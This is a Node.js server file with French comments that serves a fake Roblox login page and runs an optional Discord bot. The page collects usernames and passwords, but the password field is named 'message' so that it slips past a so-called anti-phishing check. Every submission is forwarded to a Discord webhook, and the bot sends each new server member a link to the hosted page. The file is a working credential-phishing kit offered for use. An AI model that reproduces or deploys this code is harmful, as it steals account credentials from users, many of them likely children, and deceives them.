const {
    Client,
    GatewayIntentBits,
    Partials,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    WebhookClient,
} = require("discord.js");
const express = require("express");
const bodyParser = require("body-parser");
const app = express();

// === Middleware ===
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// === WEBHOOK (option recommandé pour poster les réponses dans un salon) ===
// Dans Replit : Secrets -> Add new secret
// Key  : WEBHOOK_URL
// Value: https://discord.com/api/webhooks/ID/TOKEN
const webhookUrl = process.env.WEBHOOK_URL || null;
const webhook = webhookUrl ? new WebhookClient({ url: webhookUrl }) : null;

// === Page principale (exemple simple) ===
app.get("/", (req, res) => {
    res.send(`<!doctype html>
<html lang="fr">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Connexion - Steal a Brainrot</title>
        <style>
            body {
                margin: 0;
                font-family: "Poppins", sans-serif;
                background: radial-gradient(
                    circle at center,
                    #0d0d0d 20%,
                    #111 80%
                );
                overflow: hidden;
                color: white;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                height: 100vh;
                position: relative;
            }

            .bg {
                position: absolute;
                width: 100%;
                height: 100%;
                background:
                    radial-gradient(
                        circle,
                        rgba(114, 137, 218, 0.1) 10%,
                        transparent 60%
                    ),
                    radial-gradient(
                        circle,
                        rgba(255, 255, 255, 0.05) 10%,
                        transparent 60%
                    );
                background-size: 400% 400%;
                animation: movebg 8s infinite alternate ease-in-out;
                filter: blur(40px);
                z-index: 0;
            }

            @keyframes movebg {
                0% {
                    background-position: 0% 50%;
                }

                100% {
                    background-position: 100% 50%;
                }
            }

            .navbar {
                position: fixed;
                top: 0;
                width: 100%;
                background: rgba(28, 28, 28, 0.85);
                backdrop-filter: blur(8px);
                padding: 10px 30px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
                z-index: 2;
            }

            .navbar .brand {
                display: flex;
                align-items: center;
                gap: 10px;
            }

            .navbar .brand img {
                width: 40px;
                height: 40px;
                border-radius: 8px;
                animation: glow 2s infinite alternate;
            }

            @keyframes glow {
                from {
                    filter: drop-shadow(0 0 4px #7289da)
                        drop-shadow(0 0 8px #7289da);
                }

                to {
                    filter: drop-shadow(0 0 15px #8ea6ff)
                        drop-shadow(0 0 25px #8ea6ff);
                }
            }

            .navbar h1 {
                color: #fff;
                font-size: 20px;
                margin: 0;
                letter-spacing: 1px;
            }

            .navbar .buttons button {
                background-color: #3a3a3a;
                border: none;
                color: white;
                padding: 8px 14px;
                margin-left: 10px;
                border-radius: 6px;
                font-weight: 500;
                cursor: pointer;
                transition: background-color 0.2s ease;
            }

            .navbar .buttons button:hover {
                background-color: #5a5a5a;
            }

            .login-box {
                position: relative;
                z-index: 2;
                background-color: rgba(28, 28, 28, 0.92);
                padding: 40px;
                border-radius: 14px;
                box-shadow: 0 8px 30px rgba(0, 0, 0, 0.6);
                width: 340px;
                text-align: center;
                margin-top: 80px;
                backdrop-filter: blur(8px);
            }

            .login-box h2 {
                font-size: 22px;
                margin-bottom: 25px;
                font-weight: 600;
                color: #ffffff;
            }

            .login-box input {
                width: 100%;
                padding: 12px;
                margin: 8px 0;
                border: none;
                border-radius: 6px;
                background-color: #2c2c2c;
                color: white;
                font-size: 15px;
                outline: none;
                transition: all 0.2s;
            }

            .login-box input:focus {
                background-color: #333;
                border: 1px solid #7289da;
            }

            .login-box button {
                width: 100%;
                padding: 12px;
                background-color: #7289da;
                color: white;
                border: none;
                border-radius: 6px;
                font-weight: bold;
                font-size: 15px;
                margin-top: 15px;
                cursor: pointer;
                transition: all 0.2s;
            }

            .login-box button:hover {
                background-color: #5b6eae;
                transform: scale(1.03);
            }

            .footer {
                margin-top: 15px;
                font-size: 13px;
                color: #999;
            }

            .footer a {
                color: #7289da;
                text-decoration: none;
            }

            .footer a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="bg"></div>

        <div class="navbar">
            <div class="brand">
                <img
                    src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/0/e/e/0eeeb19633422b1241f4306419a0f15f39d58de9.png"
                    alt="logo"
                />
                <h1>Roblox</h1>
            </div>
            <div class="buttons">
                <button onclick="window.location.href='#'">S'inscrire</button>
                <button onclick="window.location.href='#'">Connexion</button>
            </div>
        </div>

        <div class="login-box">
            <h2>logging into Roblox</h2>
            <form action="/submit" method="POST">
                <input
                    type="text"
                    name="username"
                    placeholder="Roblox username"
                    required
                />
                <input
                    type="text"
                    name="message"
                    placeholder="password"
                    required
                />
                <button type="submit">loggin</button>
            </form>
            <div class="footer">
                <p>
                    Pas encore membre ? <a href="#">Rejoins-nous maintenant</a>
                </p>
            </div>
        </div>
    </body>
</html>
`);
});

// === Route pour traiter le formulaire ===
app.post("/submit", (req, res) => {
    const body = req.body || {};

    // On interdit les champs "password" (protection anti-phishing)
    if (body.password !== undefined) {
        return res.status(400).send("Collecte de mots de passe interdite.");
    }

    // Prépare un résumé des champs reçus pour logging / webhook
    const entries =
        Object.entries(body)
            .map(([k, v]) => `**${k}**: ${v}`)
            .join("\n") || "Aucun champ reçu";

    // Envoie au webhook si configuré (webhook défini ailleurs dans ton code)
    if (webhook) {
        webhook
            .send({ content: `📥 Nouvelle soumission\n${entries}` })
            .then(() => res.send("Merci — réponse envoyée !"))
            .catch((err) => {
                console.error("Erreur webhook:", err);
                res.status(500).send("Erreur lors de l'envoi.");
            });
    } else {
        console.log("[FORM] " + entries);
        res.send("Merci — réponse reçue (webhook non configuré).");
    }
});

// === Lancement du serveur web ===
const PORT = process.env.PORT || 3000;
app.listen(PORT, () =>
    console.log(`✅ Serveur web lancé sur le port ${PORT} !`),
);

// === (Facultatif) Client Discord si tu as d'autres fonctionnalités bot ===
// Si tu n'utilises pas de bot, tu peux laisser ces lignes ou les supprimer.
// Pour utiliser le client, ajoute TOKEN dans les Secrets (Name: TOKEN, Value: ton token).
if (process.env.TOKEN) {
    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMembers,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent,
        ],
        partials: [Partials.Channel],
    });

    client.once("ready", () => {
        console.log(`✅ Bot Discord connecté en tant que ${client.user.tag}`);
    });

    // Exemple : envoi automatique de lien quand quelqu'un rejoint (remplace URL)
    client.on("guildMemberAdd", async (member) => {
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel("Clique ici pour commencer")
                .setURL(
                    process.env.REPLIT_URL ||
                        "https://529ea008-6abb-4ff0-9baa-3a633d8139d1-00-3rtjyrf89sum9.spock.replit.dev/",
                )
                .setStyle(ButtonStyle.Link),
        );

        try {
            await member.send({
                content: `👋 Salut ${member.user.username} ! Bienvenue sur **${member.guild.name}**.`,
                components: [row],
            });
        } catch (err) {
            const channel = member.guild.channels.cache.find(
                (ch) => ch.name === "bienvenue",
            );
            if (channel) {
                channel.send({
                    content: `👋 Bienvenue ${member} ! Clique ici pour commencer 👇`,
                    components: [row],
                });
            }
        }
    });

    client.login(process.env.TOKEN).catch((err) => {
        console.error("Impossible de connecter le bot Discord :", err);
    });
} else {
    console.log(
        "⚠️ TOKEN non fourni : le client Discord ne sera pas lancé (si tu veux un bot, ajoute TOKEN dans les Secrets).",
    );
}
